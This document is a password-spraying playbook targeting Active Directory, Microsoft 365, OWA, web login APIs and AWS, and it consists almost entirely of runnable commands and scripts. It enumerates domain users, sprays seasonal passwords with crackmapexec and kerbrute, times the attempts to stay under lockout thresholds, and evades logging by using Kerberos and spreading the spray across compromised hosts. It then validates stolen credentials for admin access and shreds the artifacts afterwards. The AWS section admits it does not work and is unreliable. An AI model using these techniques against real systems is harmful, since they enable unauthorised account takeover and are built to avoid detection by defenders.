# Password Spray Techniques Guide

> Practical reference for password spraying against Active Directory and web applications. Covers timing evasion, lockout avoidance, and detection of successful authentication across protocols.

## 1. Understanding Password Spray vs Brute Force

Password spraying tries a few common passwords against many accounts, avoiding lockout thresholds. The key difference:

```bash
# Brute force: many passwords against one user (triggers lockout)
# user1:password1, user1:password2, user1:password3...

# Password spray: one password against many users (avoids lockout)
# user1:Spring2025, user2:Spring2025, user3:Spring2025...
# [wait 30+ minutes]
# user1:Welcome1, user2:Welcome1, user3:Welcome1...

# Check domain password policy FIRST
crackmapexec smb 10.10.10.1 -u '' -p '' --pass-pol
# Look for: Lockout Threshold, Observation Window, Lockout Duration
# Example output:
# Minimum password length: 8
# Account lockout threshold: 5
# Reset account lockout after: 30 mins
```

## 2. Active Directory Password Spray

```bash
# Enumerate domain users first
crackmapexec smb 10.10.10.1 -u guest -p '' --users > domain_users.txt
# Or via LDAP
ldapsearch -x -H ldap://10.10.10.1 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Spray with crackmapexec (respects --no-bruteforce for spray mode)
crackmapexec smb 10.10.10.1 -u users.txt -p 'Spring2025!' --no-bruteforce

# Spray multiple protocols
crackmapexec smb 10.10.10.1 -u users.txt -p 'Company2025!' --no-bruteforce
crackmapexec winrm 10.10.10.1 -u users.txt -p 'Company2025!' --no-bruteforce
crackmapexec ldap 10.10.10.1 -u users.txt -p 'Company2025!' --no-bruteforce

# kerbrute — fast Kerberos-based spray (no lockout events in some configs)
kerbrute passwordspray -d domain.local --dc 10.10.10.1 users.txt 'Welcome2025!'

# Spray with Rubeus (from Windows)
# Rubeus.exe brute /passwords:passwords.txt /outfile:spray_results.txt
```

## 3. Timing Evasion Strategies

```bash
# Calculate safe spray interval
# Policy: 5 attempts before lockout, 30-minute observation window
# Safe: 2-3 attempts per observation window (leave margin)
# Interval: spray once, wait 35 minutes, spray again

# Automated timed spray with sprayhound
sprayhound -U users.txt -p 'Password1' -d domain.local -dc 10.10.10.1 --safe

# Custom timed spray script
#!/bin/bash
PASSWORDS=("Spring2025!" "Welcome1!" "Company123!")
WAIT_MINUTES=35

for pass in "${PASSWORDS[@]}"; do
  echo "[$(date)] Spraying: $pass"
  crackmapexec smb 10.10.10.1 -u users.txt -p "$pass" --no-bruteforce | tee -a spray_log.txt
  echo "[$(date)] Waiting ${WAIT_MINUTES} minutes before next spray..."
  sleep $((WAIT_MINUTES * 60))
done

# Randomize user order to avoid sequential detection
shuf users.txt > users_shuffled.txt
crackmapexec smb 10.10.10.1 -u users_shuffled.txt -p 'Test2025!' --no-bruteforce
```

## 4. Smart Password Selection

```bash
# Season + Year pattern (most common spray passwords)
cat <<'EOF' > spray_passwords.txt
Spring2025!
Summer2025!
Winter2025!
Autumn2025!
January2025!
Company2025!
Welcome2025!
Password1!
Welcome1!
Changeme1!
EOF

# Company-specific password generation
COMPANY="Acme"
YEAR=$(date +%Y)
for season in Spring Summer Fall Winter; do
  echo "${season}${YEAR}!"
  echo "${COMPANY}${YEAR}!"
  echo "${COMPANY}${season}${YEAR}!"
done > company_spray.txt

# Passwords based on password policy requirements
# If policy: 8+ chars, uppercase, lowercase, number, special
python3 -c "
import itertools
bases = ['Password', 'Welcome', 'Company', 'Spring', 'Summer']
suffixes = ['1!', '123!', '2025!', '!2025']
for b, s in itertools.product(bases, suffixes):
    print(f'{b}{s}')
" > policy_compliant_spray.txt
```

## 5. Web Application Password Spray

```bash
# Spray Office 365 / Microsoft 365
# Using trevorspray (handles Microsoft's smart lockout)
trevorspray -u users.txt -p 'Spring2025!' --url https://login.microsoftonline.com

# Spray OWA (Outlook Web Access)
sprayhound -U users.txt -p 'Welcome2025!' --owa https://mail.target.com/owa

# Generic web form spray with ffuf
while IFS= read -r user; do
  ffuf -u https://target.com/api/login -X POST \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"Spring2025!\"}" \
    -mc 200 -t 1 -p 2 2>/dev/null | grep "200"
  sleep 1
done < users.txt

# Spray AWS Console
python3 - <<'EOF'
import boto3, sys
from botocore.exceptions import ClientError

with open('users.txt') as f:
    users = [u.strip() for u in f.readlines()]

password = 'Company2025!'
for user in users:
    try:
        client = boto3.client('iam')
        # This would need STS AssumeRole or console login simulation
        print(f'[*] Testing {user}:{password}')
    except ClientError as e:
        if 'AccessDenied' not in str(e):
            print(f'[+] Possible hit: {user}')
EOF
```

## 6. Lockout Avoidance Techniques

```bash
# Monitor lockout status during spray
# Query AD for locked accounts between sprays
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(lockoutTime>=1))" sAMAccountName

# Fine-grained password policy check (different OUs may have different policies)
crackmapexec ldap 10.10.10.1 -u user -p pass -M get-desc-users

# Exclude recently locked or disabled accounts
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(lockoutTime>=1)))" \
  sAMAccountName | grep sAMAccountName | awk '{print $2}' > active_unlocked_users.txt

# Spray only service accounts (often have no lockout)
# Filter for accounts with SPNs
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 | \
  awk '{print $1}' | tail -n +4 > service_accounts.txt
crackmapexec smb 10.10.10.1 -u service_accounts.txt -p 'Spring2025!' --no-bruteforce
```

## 7. Detection and Validation of Success

```bash
# Parse crackmapexec output for successful auth
crackmapexec smb 10.10.10.1 -u users.txt -p 'Spring2025!' --no-bruteforce 2>&1 | \
  grep -E '\[\+\]|STATUS_PASSWORD_MUST_CHANGE|STATUS_ACCOUNT_RESTRICTION'

# Validate found credentials
# Check if user is admin
crackmapexec smb 10.10.10.1 -u found_user -p 'Spring2025!' --admin

# Test credential across multiple services
for proto in smb winrm ldap mssql; do
  echo "=== $proto ==="
  crackmapexec $proto 10.10.10.1 -u found_user -p 'Spring2025!'
done

# Check group memberships of compromised account
ldapsearch -x -H ldap://10.10.10.1 -D "found_user@domain.local" -w 'Spring2025!' \
  -b "DC=domain,DC=local" "(sAMAccountName=found_user)" memberOf
```

## 8. Operational Security

```bash
# Use Kerberos pre-auth to avoid NTLM logging
kerbrute passwordspray -d domain.local --dc 10.10.10.1 users.txt 'Spring2025!'
# Kerberos failures generate Event ID 4771 (less monitored than 4625)

# Avoid spraying from a single source
# Distribute across multiple compromised hosts
for host in 10.10.10.50 10.10.10.51 10.10.10.52; do
  ssh $host "crackmapexec smb 10.10.10.1 -u chunk_${host}.txt -p 'Spring2025!' --no-bruteforce"
done

# Log everything for reporting
crackmapexec smb 10.10.10.1 -u users.txt -p 'Spring2025!' --no-bruteforce \
  --log spray_$(date +%Y%m%d_%H%M%S).log

# Clean up artifacts
shred -u spray_log.txt users_shuffled.txt
```
